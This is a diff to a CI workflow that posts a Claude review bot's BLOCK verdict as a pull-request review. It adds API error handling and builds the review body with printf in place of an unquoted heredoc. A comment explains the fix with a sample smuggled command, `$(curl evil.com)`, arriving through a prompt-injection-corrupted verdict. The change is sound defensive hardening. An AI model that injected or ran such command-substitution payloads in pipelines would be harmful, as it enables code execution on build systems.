@@ -151,9 +151,22 @@ jobs:
           # SHA, don't post a duplicate. We scope by commit_id so
           # stale reviews on prior commits don't suppress mirroring
           # of the current verdict.
-          head_sha=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json headRefOid --jq '.headRefOid')
-          existing=$(gh api "repos/$REPO/pulls/$PR_NUMBER/reviews" \
-            --jq "[.[] | select(.commit_id == \"$head_sha\")] | length")
+          #
+          # Fail OPEN on API errors: the whole point of this fallback
+          # is resilience, so a transient gh/api failure should never
+          # be the reason a BLOCK silently disappears. We'd rather
+          # post one extra mirror review than drop a real BLOCK.
+          # `--paginate` covers the (exotic) case where a single PR
+          # has >30 reviews on one commit.
+          head_sha=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json headRefOid --jq '.headRefOid' 2>/dev/null || echo "")
+          if [ -z "$head_sha" ]; then
+            echo "::warning::Couldn't query PR HEAD SHA — posting mirror without dedup check."
+            existing=0
+          else
+            existing=$(gh api --paginate "repos/$REPO/pulls/$PR_NUMBER/reviews" \
+              --jq "[.[] | select(.commit_id == \"$head_sha\")] | length" \
+              2>/dev/null || echo 0)
+          fi
           if [ "${existing:-0}" -gt 0 ]; then
             echo "::notice::Bot already posted ${existing} review(s) on $head_sha — no mirror needed."
             exit 0
@@ -161,16 +174,24 @@ jobs:
 
           reason="${verdict#BLOCK}"
           reason="${reason#:}"
-          body=$(cat <<EOF
-          The Claude review bot reached a \`BLOCK\` verdict but couldn't post a formal review (typically tool-permission denials at the action level — see the workflow run logs for the bot's full reasoning).
-
-          Surfacing the verdict here so it's visible in the PR UI:
-
-          > **BLOCK:**${reason}
-
-          Push a fix and the bot will re-review. If the verdict is wrong, push a clarifying commit and re-run the \`Claude Code Review\` workflow.
-          EOF
-          )
+          # Build the body with printf rather than an unquoted heredoc.
+          # Bash expands `${reason}` to its literal string value before
+          # printf sees the argument, and printf does NOT interpret
+          # command substitutions in its arguments — so even if the
+          # verdict file contains shell metacharacters (e.g.
+          # `BLOCK: oops $(curl evil.com)` from a prompt-injection-
+          # corrupted verdict), they stay literal. The previous
+          # `cat <<EOF ... EOF` form (unquoted EOF) had command
+          # substitution active inside the heredoc, which would have
+          # executed any `$(...)` smuggled through the verdict.
+          body=$(printf '%s\n' \
+            "The Claude review bot reached a \`BLOCK\` verdict but couldn't post a formal review (typically tool-permission denials at the action level — see the workflow run logs for the bot's full reasoning)." \
+            "" \
+            "Surfacing the verdict here so it's visible in the PR UI:" \
+            "" \
+            "> **BLOCK:**${reason}" \
+            "" \
+            "Push a fix and the bot will re-review. If the verdict is wrong, push a clarifying commit and re-run the \`Claude Code Review\` workflow.")
           gh pr review "$PR_NUMBER" --repo "$REPO" --request-changes --body "$body"
           echo "::notice::Mirrored BLOCK verdict to a PR review (bot failed to post one directly)."
 
